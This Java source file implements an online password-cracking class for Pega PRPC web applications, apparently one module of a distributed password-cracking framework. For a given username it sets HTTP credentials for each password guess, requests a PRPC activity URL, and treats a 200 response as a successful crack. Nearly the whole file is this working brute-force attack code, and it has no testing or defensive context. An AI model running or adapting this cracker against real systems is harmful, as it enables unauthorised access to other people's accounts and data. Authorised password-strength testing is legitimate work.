//$Id: PRPCHTTPCracker.java 5932 2013-01-11 12:19:16Z ChristopherSmith $
package distributedMultiThreadedFramework.PasswordCracking;

import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CookieStore;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.params.ClientPNames;
import org.apache.http.client.params.CookiePolicy;
import org.apache.http.client.protocol.ClientContext;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;


/**
 * tries to attack the PRPC via logins
 * 
 * @author smitc
 * @author olivb
 */
public class PRPCHTTPCracker extends CrackExecutor{
	String host = "";
	int port = 80;
	String username = "";
	CookieStore cookieStore = null;
	HttpGet methodGet = null;
	String rootURL = "";
	DefaultHttpClient client = null;
	AuthScope auth = null;
	
	
	/**
	 * 
	 * @param host: machine name
	 * @param port: port on that machine (where the PRPC instance is located)
	 * @param username: username to test
	 * @param URLActivity: a PRPC activity to try against the login credentials
	 */
	public PRPCHTTPCracker(String username, String host, String port, String URLActivity) {
		this.host = host;
		this.port = Integer.valueOf(port);
		this.username = username;
		this.cookieStore = new BasicCookieStore();
		this.rootURL = "http://" + this.host + ":" + this.port;
		this.methodGet = new HttpGet(this.rootURL + URLActivity);
		this.client = new DefaultHttpClient();
		this.auth = new AuthScope(this.host, this.port);
		createClient(this.rootURL);

	}


	/**
	 * crack override
	 * 
	 * @param password: current password guess
	 * @return: true if the return code status is OK, false otherwise
	 */
	@Override
	public boolean crack(String password) {
		System.out.println(password);
		
		return this.PRPCLogin(password) == 200;
	}

	
	/**
	 * creates a client connection
	 * 
	 * @param rootURL: URL up to PRServlet
	 * @param password: current password guess
	 */
	private void createClient(String rootURL){
		
		this.client.getParams().setParameter(ClientPNames.ALLOW_CIRCULAR_REDIRECTS, true); 
		this.client.getParams().setParameter(ClientPNames.COOKIE_POLICY, CookiePolicy.RFC_2109);

		
		//detect if host still up after inactivity
		//HttpConnectionParams.setSoKeepalive(this.client.getParams(), true);
		
		//how long to linger before completing the socket close
		//HttpConnectionParams.setLinger(this.client.getParams(), 500);	
		
		//reuse socket address during timeout phase (rebinding)
		HttpConnectionParams.setSoReuseaddr(this.client.getParams(), true);
		
		
		//try to conserve bandwidth? uses Nagle Algo
		//HttpConnectionParams.setTcpNoDelay(client.getParams(), true);
		
		//size of internal socket buffer size
		//HttpConnectionParams.setSocketBufferSize(client.getParams(), 64);
		
		//checks if connection is dead 30 ms overhead
		//HttpConnectionParams.setStaleCheckingEnabled(client.getParams(), true);
	}
	
	private void updatePassword(String password){
		this.client.getCredentialsProvider().setCredentials(this.auth,
                new UsernamePasswordCredentials(this.username, password));
	}

	
	/**
	 * tries to create user and log into PRPC
	 * 
	 * @param password: current password guess
	 * @return: status code from the request
	 */
	public int PRPCLogin(String password) {
		try {
			updatePassword(password);
			
			HttpParams params = this.methodGet.getParams();
			params.setParameter(ClientPNames.HANDLE_REDIRECTS, Boolean.TRUE);
			
			this.methodGet.setParams(params);
		
            // Create local HTTP context
            HttpContext localContext = new BasicHttpContext();

            // Bind custom cookie store to the local context
            localContext.setAttribute(ClientContext.COOKIE_STORE, this.cookieStore);
            
			HttpResponse httpResponse = this.client.execute(this.methodGet, localContext);
			int codeGet = httpResponse.getStatusLine().getStatusCode();

			if (codeGet > 200 && codeGet < 300)
				System.out.println("Call returned: Successful (" + codeGet + ")");


			return codeGet;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}

	/**
	 * resets the cookies and methods and credentials 
	 */
	@Override
	public void reset() {
		try{
			this.cookieStore.clear();
			this.methodGet.reset();
			this.client.getCredentialsProvider().clear();
			
		}catch(Exception e){
			e.printStackTrace();
		}
	}
}
